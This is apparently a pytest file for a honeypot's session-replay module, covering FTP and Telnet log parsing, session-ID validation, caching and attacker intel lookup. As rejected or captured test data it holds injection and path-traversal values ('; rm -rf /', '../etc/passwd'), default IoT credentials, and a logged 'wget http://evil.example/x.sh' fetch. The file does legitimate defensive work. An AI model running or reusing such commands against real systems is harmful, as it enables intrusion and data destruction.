"""Tests for replay.py — the session-replay data layer."""

import json
import os
import time
from datetime import datetime, timezone

import pytest

import replay


# ─────────────────────────────────────────────────────────────
#  session_id validation
# ─────────────────────────────────────────────────────────────

class TestSessionIdValidation:
    @pytest.mark.parametrize("sid", [
        "127.0.0.1_093945",
        "192.0.2.4_120000",
        "2001:db8::1_235959",
        "abc:def::1_000000",
    ])
    def test_accepts_valid_ids(self, sid):
        replay._validate_session_id(sid)  # no raise

    @pytest.mark.parametrize("sid", [
        "",
        None,
        "../etc/passwd_093945",
        "127.0.0.1",            # missing suffix
        "127.0.0.1_9394",       # too few digits
        "127.0.0.1_0939455",    # too many digits
        "; rm -rf /_093945",
        "127.0.0.1_093945\n",   # newline
    ])
    def test_rejects_invalid_ids(self, sid):
        with pytest.raises(ValueError):
            replay._validate_session_id(sid)


# ─────────────────────────────────────────────────────────────
#  log-line parser (modern + legacy)
# ─────────────────────────────────────────────────────────────

class TestParseLogLine:
    def test_modern_json_line(self):
        line = '{"ts": "01:46:38.413", "dir": "SERVER", "data": "220 ready"}'
        ts, d, data = replay._parse_log_line(line)
        assert ts == "01:46:38.413"
        assert d == "SERVER"
        assert data == "220 ready"

    def test_legacy_bracket_line(self):
        line = "[09:39:45.601] SERVER: 220 banner sent"
        ts, d, data = replay._parse_log_line(line)
        assert ts == "09:39:45.601"
        assert d == "SERVER"
        assert data == "220 banner sent"

    def test_empty_line(self):
        assert replay._parse_log_line("") is None
        assert replay._parse_log_line("\n") is None
        assert replay._parse_log_line("   ") is None

    def test_malformed_json(self):
        assert replay._parse_log_line('{"ts": invalid}') is None

    def test_garbage_line(self):
        assert replay._parse_log_line("not a real log entry") is None


# ─────────────────────────────────────────────────────────────
#  replay_loader — end-to-end timeline assembly
# ─────────────────────────────────────────────────────────────

class TestReplayLoader:
    @pytest.fixture
    def session_log(self, tmp_path):
        sid = "192.0.2.4_120000"
        path = tmp_path / f"ftp_session_{sid}.log"
        # Patched ftp_log() output: monotonic times, CLIENT + SERVER alternation
        lines = [
            '{"ts": "12:00:00.000", "dir": "SERVER", "data": "220 NVR-4200 ready"}',
            '{"ts": "12:00:00.500", "dir": "CLIENT", "data": "USER admin"}',
            '{"ts": "12:00:00.510", "dir": "SERVER", "data": "331 Password required"}',
            '{"ts": "12:00:02.100", "dir": "CLIENT", "data": "PASS hunter2"}',
            '{"ts": "12:00:02.111", "dir": "CRED",   "data": "USER=admin PASS=hunter2"}',
            '{"ts": "12:00:02.115", "dir": "SERVER", "data": "230 Login successful"}',
        ]
        path.write_text("\n".join(lines) + "\n")
        return sid, str(tmp_path), path

    def test_unified_timeline_shape(self, session_log):
        sid, log_dir, _ = session_log
        result = replay.replay_loader(sid, log_dir=log_dir)
        assert result["session_id"] == sid
        assert result["ip"] == "192.0.2.4"
        assert result["duration_ms"] == 2115  # last - first
        assert len(result["events"]) == 6
        assert result["events"][0]["t_ms"] == 0
        assert result["events"][0]["kind"] == "server"  # lowercased
        assert result["events"][-1]["t_ms"] == 2115
        assert result["started_at"].endswith("+00:00")
        assert result["ended_at"].endswith("+00:00")

    def test_events_are_chronologically_ordered(self, session_log):
        sid, log_dir, _ = session_log
        result = replay.replay_loader(sid, log_dir=log_dir)
        ts_list = [e["t_ms"] for e in result["events"]]
        assert ts_list == sorted(ts_list)

    def test_missing_session_log_raises(self, tmp_path):
        with pytest.raises(FileNotFoundError):
            replay.replay_loader("10.0.0.1_120000", log_dir=str(tmp_path))

    def test_invalid_session_id_raises(self, tmp_path):
        with pytest.raises(ValueError):
            replay.replay_loader("../etc/passwd_120000", log_dir=str(tmp_path))

    def test_legacy_format_log_still_parses(self, tmp_path):
        sid = "127.0.0.1_093945"
        path = tmp_path / f"ftp_session_{sid}.log"
        path.write_text(
            "[09:39:45.601] SERVER: 220 banner sent\n"
            "[09:39:45.601] CLIENT: LIST\n"
            "[09:39:45.602] SESSION_END: total session logged to /tmp/foo\n"
        )
        result = replay.replay_loader(sid, log_dir=str(tmp_path))
        assert len(result["events"]) == 3
        assert result["events"][0]["kind"] == "server"
        assert result["events"][1]["kind"] == "client"


# ─────────────────────────────────────────────────────────────
#  replay_index — directory scan + cache
# ─────────────────────────────────────────────────────────────

class TestReplayIndex:
    def test_scan_finds_sessions(self, tmp_path):
        for sid in ("192.0.2.4_120000", "10.0.0.1_113000"):
            (tmp_path / f"ftp_session_{sid}.log").write_text(
                '{"ts": "12:00:00.000", "dir": "SERVER", "data": "x"}\n')
        # Decoy non-matching files should be ignored
        (tmp_path / "ftp_session_garbage.log").write_text("nope")
        (tmp_path / "random.json").write_text("{}")

        # bypass cache: pass distinct log_dir
        idx = replay.replay_index(log_dir=str(tmp_path))
        sids = sorted(r["session_id"] for r in idx)
        assert sids == ["10.0.0.1_113000", "192.0.2.4_120000"]
        assert all("event_count" in r for r in idx)
        assert all(r["protocol"] == "ftp" for r in idx)

    def test_empty_dir_returns_empty(self, tmp_path):
        # A fresh tmp_path => empty list, no crash
        assert replay.replay_index(log_dir=str(tmp_path)) == []

    def test_cache_invalidates_when_new_session_arrives(self, tmp_path):
        import os as _os
        # Pin dir mtime to t=1000 so the cache snapshot is deterministic.
        (tmp_path / "ftp_session_1.1.1.1_120000.log").write_text("x")
        _os.utime(str(tmp_path), (1000, 1000))
        first = replay.replay_index(log_dir=str(tmp_path))
        assert len(first) == 1
        # New session lands within the 5s TTL — bump dir mtime so cache invalidates.
        (tmp_path / "ftp_session_2.2.2.2_120000.log").write_text("x")
        _os.utime(str(tmp_path), (2000, 2000))
        second = replay.replay_index(log_dir=str(tmp_path))
        assert len(second) == 2

    def test_cache_hit_returns_independent_copy(self, tmp_path):
        (tmp_path / "ftp_session_192.0.2.4_120000.log").write_text("x")
        a = replay.replay_index(log_dir=str(tmp_path))
        b = replay.replay_index(log_dir=str(tmp_path))
        assert a == b           # cache hit → same content
        assert a is not b       # but distinct lists — mutating one must not corrupt the other
        a.clear()
        c = replay.replay_index(log_dir=str(tmp_path))
        assert c == b           # cache survived the mutation of `a`


# ─────────────────────────────────────────────────────────────
#  Three-part session_id (ip_HHMMSS_microsec) — added by FTP per-connect uniqueness
# ─────────────────────────────────────────────────────────────

class TestThreePartSessionId:
    @pytest.mark.parametrize("sid", [
        "192.0.2.4_120000_123456",
        "127.0.0.1_093945_000001",
        "10.0.0.1_113000_999999",
        "2001:db8::1_235959_42",
    ])
    def test_validate_accepts_three_part(self, sid):
        replay._validate_session_id(sid)  # no raise

    @pytest.mark.parametrize("sid", [
        "192.0.2.4_120000_",       # trailing underscore, no microsec
        "192.0.2.4_120000_abc",    # non-digit microsec
        "192.0.2.4_12000_123456",  # HHMMSS not 6 digits
    ])
    def test_validate_rejects_malformed_three_part(self, sid):
        with pytest.raises(ValueError):
            replay._validate_session_id(sid)

    def test_replay_loader_three_part_extracts_ip(self, tmp_path):
        sid = "192.0.2.4_120000_123456"
        (tmp_path / f"ftp_session_{sid}.log").write_text(
            '{"ts": "12:00:00.000", "dir": "SERVER", "data": "220 ready"}\n'
            '{"ts": "12:00:00.500", "dir": "CLIENT", "data": "USER admin"}\n'
        )
        result = replay.replay_loader(sid, log_dir=str(tmp_path))
        assert result["session_id"] == sid
        assert result["ip"] == "192.0.2.4"  # microsec stripped, not "192.0.2.4_120000"
        assert len(result["events"]) == 2

    def test_replay_index_finds_three_part(self, tmp_path):
        for sid in ("192.0.2.4_120000_111111", "10.0.0.1_113000_222222"):
            (tmp_path / f"ftp_session_{sid}.log").write_text(
                '{"ts": "12:00:00.000", "dir": "SERVER", "data": "x"}\n')
        idx = replay.replay_index(log_dir=str(tmp_path))
        sids = sorted(r["session_id"] for r in idx)
        ips = sorted(r["ip"] for r in idx)
        assert sids == ["10.0.0.1_113000_222222", "192.0.2.4_120000_111111"]
        assert ips == ["10.0.0.1", "192.0.2.4"]  # IP correctly extracted from 3-part

    def test_two_and_three_part_coexist_in_index(self, tmp_path):
        (tmp_path / "ftp_session_1.2.3.4_120000.log").write_text(
            '{"ts": "12:00:00.000", "dir": "SERVER", "data": "x"}\n')
        (tmp_path / "ftp_session_5.6.7.8_120000_500000.log").write_text(
            '{"ts": "12:00:00.000", "dir": "SERVER", "data": "x"}\n')
        idx = replay.replay_index(log_dir=str(tmp_path))
        by_ip = {r["ip"]: r["session_id"] for r in idx}
        assert by_ip["1.2.3.4"] == "1.2.3.4_120000"
        assert by_ip["5.6.7.8"] == "5.6.7.8_120000_500000"


# ─────────────────────────────────────────────────────────────
#  load_intel — passive OSINT lookup
# ─────────────────────────────────────────────────────────────

class TestLoadIntel:
    def test_missing_recon_returns_empty(self, tmp_path):
        assert replay.load_intel("198.51.100.7", log_dir=str(tmp_path)) == {}

    def test_reads_recon_file(self, tmp_path):
        ip = "203.0.113.42"
        (tmp_path / "recon_203_0_113_42.json").write_text(json.dumps({
            "country": "RU",
            "city": "Moscow",
            "asn": "AS12345",
            "org": "Example Telecom",
            "abuse_score": 87,
            "tags": ["bruteforce", "scanner"],
            "hostname": "scanner.example.ru",
            "notes": "seen 14 times",
            "secret_field": "should NOT be exposed",
        }))
        intel = replay.load_intel(ip, log_dir=str(tmp_path))
        assert intel["ip"] == ip
        assert intel["country"] == "RU"
        assert intel["abuse_score"] == 87
        assert intel["tags"] == ["bruteforce", "scanner"]
        # Whitelist guard — undocumented fields stay invisible
        assert "secret_field" not in intel

    def test_corrupt_json_returns_empty(self, tmp_path):
        ip = "203.0.113.99"
        (tmp_path / "recon_203_0_113_99.json").write_text("not json at all")
        assert replay.load_intel(ip, log_dir=str(tmp_path)) == {}

    def test_non_dict_top_level_returns_empty(self, tmp_path):
        ip = "203.0.113.100"
        (tmp_path / "recon_203_0_113_100.json").write_text("[1,2,3]")
        assert replay.load_intel(ip, log_dir=str(tmp_path)) == {}


# ─────────────────────────────────────────────────────────────
#  Telnet session synthesis (drop #2.5)
# ─────────────────────────────────────────────────────────────

def _write_all_events(tmp_path, events):
    path = tmp_path / "all_events.json"
    path.write_text("\n".join(json.dumps(e) for e in events) + "\n")
    return path


def _telnet_event(ts_iso, ip, service="telnet", **data):
    return {"timestamp": ts_iso, "service": service,
            "source_ip": ip, "source_port": 0, "data": data}


class TestTelnetSessionGrouping:
    def test_groups_bursts_into_one_session(self, tmp_path):
        # 5 login attempts from one IP within 30s → 1 aggregated session.
        events = [
            _telnet_event(f"2026-06-02T02:47:{10+i:02d}+00:00",
                          "110.37.66.188", username=u, password="")
            for i, u in enumerate(["root", "xc3511", "admin", "vizxv", "default"])
        ]
        _write_all_events(tmp_path, events)
        idx = replay.replay_index(log_dir=str(tmp_path))
        telnet = [r for r in idx if r["protocol"] == "telnet"]
        assert len(telnet) == 1
        assert telnet[0]["ip"] == "110.37.66.188"
        assert telnet[0]["session_id"] == "all_110.37.66.188"
        assert telnet[0]["attempts"] == 1
        # 5 telnet events + 1 attempt marker = 6
        assert telnet[0]["event_count"] == 6

    def test_gap_groups_multi_attempts_into_one_aggregated_row(self, tmp_path):
        # Same IP, two bursts separated by > 5 min → 1 aggregated row (attempts=2).
        # Per-attempt drill-down stays accessible via the individual session_ids.
        events = [
            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
            _telnet_event("2026-06-02T02:47:15+00:00", "1.2.3.4", username="admin"),
            # Big gap (10 min)
            _telnet_event("2026-06-02T02:57:30+00:00", "1.2.3.4", username="guest"),
        ]
        _write_all_events(tmp_path, events)
        idx = replay.replay_index(log_dir=str(tmp_path))
        telnet = [r for r in idx if r["protocol"] == "telnet"]
        assert len(telnet) == 1
        assert telnet[0]["session_id"] == "all_1.2.3.4"
        assert telnet[0]["attempts"] == 2
        # Individual attempts still loadable via the per-burst format.
        tl = replay.replay_loader("1.2.3.4_024710", protocol="telnet",
                                  log_dir=str(tmp_path))
        assert tl["ip"] == "1.2.3.4"
        assert len(tl["events"]) == 2

    def test_different_ips_get_different_sessions(self, tmp_path):
        events = [
            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
            _telnet_event("2026-06-02T02:47:11+00:00", "5.6.7.8", username="root"),
        ]
        _write_all_events(tmp_path, events)
        idx = replay.replay_index(log_dir=str(tmp_path))
        telnet = sorted([r for r in idx if r["protocol"] == "telnet"],
                        key=lambda r: r["ip"])
        assert len(telnet) == 2
        assert telnet[0]["ip"] == "1.2.3.4"
        assert telnet[1]["ip"] == "5.6.7.8"


class TestTelnetAggregatedLoader:
    """all_<ip> form rolls up every attempt with visible separator markers."""

    def test_aggregated_load_includes_all_attempts(self, tmp_path):
        events = [
            _telnet_event("2026-06-02T02:47:10+00:00", "9.9.9.9", username="root"),
            _telnet_event("2026-06-02T02:47:12+00:00", "9.9.9.9", username="admin"),
            _telnet_event("2026-06-02T03:00:00+00:00", "9.9.9.9", username="guest"),
        ]
        _write_all_events(tmp_path, events)
        tl = replay.replay_loader("all_9.9.9.9", protocol="telnet",
                                  log_dir=str(tmp_path))
        assert tl["ip"] == "9.9.9.9"
        # 3 telnet events + 2 attempt markers (one per burst).
        kinds = [e["kind"] for e in tl["events"]]
        assert kinds.count("connect") == 2
        # Total events: 3 telnet + 2 markers.
        assert len(tl["events"]) == 5

    def test_aggregated_load_unknown_ip_raises(self, tmp_path):
        _write_all_events(tmp_path, [])
        with pytest.raises(FileNotFoundError):
            replay.replay_loader("all_198.51.100.42", protocol="telnet",
                                 log_dir=str(tmp_path))

    def test_aggregated_session_id_validates(self):
        # Valid: all_<ipv4>
        replay._validate_session_id("all_1.2.3.4")
        # Valid: all_<ipv6 hex>
        replay._validate_session_id("all_2001:db8::1")
        # Invalid: empty IP after prefix
        with pytest.raises(ValueError):
            replay._validate_session_id("all_")
        # Invalid: shell metacharacter
        with pytest.raises(ValueError):
            replay._validate_session_id("all_1.2.3.4;rm")

    def test_attempt_marker_text_format(self, tmp_path):
        events = [
            _telnet_event("2026-06-02T02:47:10+00:00", "8.8.8.8", username="root"),
        ]
        _write_all_events(tmp_path, events)
        tl = replay.replay_loader("all_8.8.8.8", protocol="telnet",
                                  log_dir=str(tmp_path))
        marker = next(e for e in tl["events"] if e["kind"] == "connect")
        assert "ATTEMPT 1" in marker["text"]
        assert "2026-06-02" in marker["text"]
        assert "UTC" in marker["text"]


class TestTelnetGapEnvVar:
    """NETWATCH_TELNET_GAP_SEC is read at call time (not import time)."""

    def test_default_when_unset(self, monkeypatch):
        monkeypatch.delenv("NETWATCH_TELNET_GAP_SEC", raising=False)
        assert replay._telnet_gap_sec() == 300

    def test_env_override_widens_gap(self, monkeypatch, tmp_path):
        # Two attempts 10 min apart — default 300s gap → 2 markers.
        events = [
            _telnet_event("2026-06-02T02:00:00+00:00", "7.7.7.7", username="root"),
            _telnet_event("2026-06-02T02:10:00+00:00", "7.7.7.7", username="admin"),
        ]
        _write_all_events(tmp_path, events)
        monkeypatch.delenv("NETWATCH_TELNET_GAP_SEC", raising=False)
        # Force the index cache to expire so the fixture's gap takes effect.
        replay._index_cache.update({"at": 0.0, "data": None, "dir": None, "dir_mtime": 0.0})
        tl_default = replay.replay_loader("all_7.7.7.7", protocol="telnet",
                                          log_dir=str(tmp_path))
        markers_default = [e for e in tl_default["events"] if e["kind"] == "connect"]
        assert len(markers_default) == 2

        # Bump gap to 24h → one marker covering both attempts.
        monkeypatch.setenv("NETWATCH_TELNET_GAP_SEC", "86400")
        replay._index_cache.update({"at": 0.0, "data": None, "dir": None, "dir_mtime": 0.0})
        tl_wide = replay.replay_loader("all_7.7.7.7", protocol="telnet",
                                       log_dir=str(tmp_path))
        markers_wide = [e for e in tl_wide["events"] if e["kind"] == "connect"]
        assert len(markers_wide) == 1

    def test_invalid_env_falls_back_to_default(self, monkeypatch):
        monkeypatch.setenv("NETWATCH_TELNET_GAP_SEC", "notanumber")
        assert replay._telnet_gap_sec() == 300

    def test_negative_clamped_to_minimum(self, monkeypatch):
        monkeypatch.setenv("NETWATCH_TELNET_GAP_SEC", "-50")
        assert replay._telnet_gap_sec() == 1

    def test_absurd_value_clamped_to_max(self, monkeypatch):
        # 30 days = 2,592,000 seconds. Anything higher gets clamped.
        monkeypatch.setenv("NETWATCH_TELNET_GAP_SEC", "9999999999")
        assert replay._telnet_gap_sec() == replay._TELNET_GAP_MAX


class TestSessionIdHardening:
    """ipaddress-backed validation closes gaps the loose regex would let through."""

    def test_valid_ipv4_passes(self):
        replay._validate_session_id("1.2.3.4_120000")
        replay._validate_session_id("all_1.2.3.4")

    def test_valid_ipv6_passes(self):
        replay._validate_session_id("all_2001:db8::1")

    def test_path_traversal_blocked_by_regex(self):
        with pytest.raises(ValueError):
            replay._validate_session_id("all_../../etc/passwd")

    def test_malformed_ipv6_blocked_by_ipaddress(self):
        # Survives the loose regex ([0-9a-fA-F.:]+ allows this) but ipaddress rejects.
        with pytest.raises(ValueError):
            replay._validate_session_id("all_::::::")

    def test_empty_ip_after_prefix_blocked(self):
        with pytest.raises(ValueError):
            replay._validate_session_id("all_")

    def test_shell_metachar_blocked(self):
        with pytest.raises(ValueError):
            replay._validate_session_id("all_1.2.3.4;rm")

    def test_none_blocked(self):
        with pytest.raises(ValueError):
            replay._validate_session_id(None)

    def test_empty_blocked(self):
        with pytest.raises(ValueError):
            replay._validate_session_id("")


class TestTelnetByIpCache:
    """_group_telnet_by_ip is cached to stop /api/replay/all_<random> DoS."""

    def setup_method(self):
        replay._telnet_byip_cache.update({
            "at": 0.0, "data": None, "dir": None, "dir_mtime": 0.0, "gap": 0,
        })

    def test_repeat_call_hits_cache(self, tmp_path):
        events = [
            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
        ]
        _write_all_events(tmp_path, events)
        first = replay._group_telnet_by_ip(str(tmp_path))
        second = replay._group_telnet_by_ip(str(tmp_path))
        # Same object identity on the cache hit — proves no re-parse.
        assert first is second

    def test_gap_change_invalidates_cache(self, tmp_path, monkeypatch):
        events = [
            _telnet_event("2026-06-02T02:00:00+00:00", "5.5.5.5", username="root"),
            _telnet_event("2026-06-02T02:10:00+00:00", "5.5.5.5", username="admin"),
        ]
        _write_all_events(tmp_path, events)
        monkeypatch.delenv("NETWATCH_TELNET_GAP_SEC", raising=False)
        a = replay._group_telnet_by_ip(str(tmp_path))
        assert a["5.5.5.5"]["attempts"] == 2

        monkeypatch.setenv("NETWATCH_TELNET_GAP_SEC", "86400")
        b = replay._group_telnet_by_ip(str(tmp_path))
        assert b["5.5.5.5"]["attempts"] == 1
        # Different objects — cache was invalidated by gap change.
        assert a is not b


class TestTelnetReplayLoader:
    def test_loads_login_events_as_timeline(self, tmp_path):
        events = [
            _telnet_event("2026-06-02T02:47:10.500000+00:00",
                          "110.37.66.188", username="root", password=""),
            _telnet_event("2026-06-02T02:47:15.700000+00:00",
                          "110.37.66.188", username="xc3511", password=""),
            _telnet_event("2026-06-02T02:47:20.000000+00:00",
                          "110.37.66.188", service="telnet_cmd", command="ls /tmp"),
            _telnet_event("2026-06-02T02:47:25.000000+00:00",
                          "110.37.66.188", service="malware_attempt",
                          command="wget http://evil.example/x.sh"),
        ]
        _write_all_events(tmp_path, events)
        # session_id is derived from first event's HHMMSS in UTC
        sid = "110.37.66.188_024710"
        timeline = replay.replay_loader(sid, protocol="telnet",
                                        log_dir=str(tmp_path))
        assert timeline["protocol"] == "telnet"
        assert timeline["ip"] == "110.37.66.188"
        assert len(timeline["events"]) == 4
        # First two are logins, then cmd, then malware
        kinds = [e["kind"] for e in timeline["events"]]
        assert kinds == ["login", "login", "cmd", "malware"]
        # Login text shows credential pair
        assert "root" in timeline["events"][0]["text"]
        assert "xc3511" in timeline["events"][1]["text"]
        # Duration ≈ 15 seconds = 15000ms (allow tiny float error)
        assert 14500 <= timeline["duration_ms"] <= 15500

    def test_unknown_protocol_raises(self, tmp_path):
        with pytest.raises(ValueError):
            replay.replay_loader("1.2.3.4_120000", protocol="ssh",
                                 log_dir=str(tmp_path))

    def test_missing_telnet_session_raises(self, tmp_path):
        _write_all_events(tmp_path, [
            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
        ])
        with pytest.raises(FileNotFoundError):
            replay.replay_loader("9.9.9.9_120000", protocol="telnet",
                                 log_dir=str(tmp_path))

    def test_no_all_events_file_means_no_telnet_sessions(self, tmp_path):
        idx = replay.replay_index(log_dir=str(tmp_path))
        assert [r for r in idx if r["protocol"] == "telnet"] == []
